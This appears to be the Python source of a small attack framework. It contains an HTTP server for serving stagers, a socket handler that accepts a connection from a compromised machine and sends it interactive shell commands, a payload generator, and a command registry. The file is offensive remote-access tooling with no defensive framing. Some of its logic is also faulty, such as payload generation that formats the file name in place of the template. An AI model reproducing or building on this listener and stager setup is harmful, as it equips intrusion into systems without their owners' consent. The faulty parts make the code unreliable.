#!/usr/bin/python3
import rsa
import os
import socket
import pyterpreter
from termcolor import colored

commands = []


class machine:
    def __init__(self, ip, name):
        self.ip = ip
        self.public = False
        self.name = name


class server:
    def __init__(self, ip, port, protocol):
        self.ip = ip
        self.port = port
        self.protocol = protocol
    def start(self):
        if self.protocol == 'http':
            os.system("python -m http.server {} --bind {} --directory ./stager &".format(self.port, self.ip))
            self.pid = os.popen('ps | grep python').read()
            self.pid = self.pid.split('\n')
            self.pid = self.pid[-2]
            self.pid = self.pid.split(' ')[2]
            self.address = 'http://{}:{}'.format(self.ip, self.port)
            
        elif self.protocol == 'handler':
            buffer_size = 10240
            s = socket.socket()
            s.bind((self.ip, int(self.port)))
            s.listen(5)
            print(colored("Listing on {}:{}...".format(self.ip, self.port), 'green'))
            client_socket, client_address = s.accept()
            print(colored("Connection established Client - {}:{}".format(client_address[0], client_address[1]), "green"))
            banner = client_socket.recv(buffer_size).decode()
            print(banner)
            while True:
                command = input('$>')
                client_socket.send(command.encode())
                if command.lower() == 'exit':
                    break
                results = client_socket.recv(buffer_size).decode()
                print(results)
            client_socket.close()
            s.close()
            print("\n")
            print(colored("hanlder shutdown", "red"))
            pass
    def stop(self):
        if self.protocol == 'http':
            os.system("kill {}".format(self.pid))
        else:
            print("no stop function defined yet!")


class payload:
    def __init__(self, payload, template, parameters):
        self.name = payload
        self.template = template
        self.parameters = parameters
        self.payload = payload
    
    def generate(self):
        output = self.payload.format(self.parameters)
        with open("./output/{}".format(self.payload), 'w') as f:
            f.write(output)


class command:
    def __init__(self, help, name, function, needs):
        self.help_text = help
        self.name = name
        self.function = function
        self.needs = needs
        commands.append(self)
    def get_args(self):
        if self.needs != False:
            self.args = []
            for arg in self.needs:
                retarg = input("{}? $> ".format(arg))
                self.args.append(retarg)
        else:
            return
    def help(self):
        print(self.help_text)
    
    def run(self):
        if self.needs!= False:
            self.get_args()
            self.function(self.args)
        else:
            self.function()

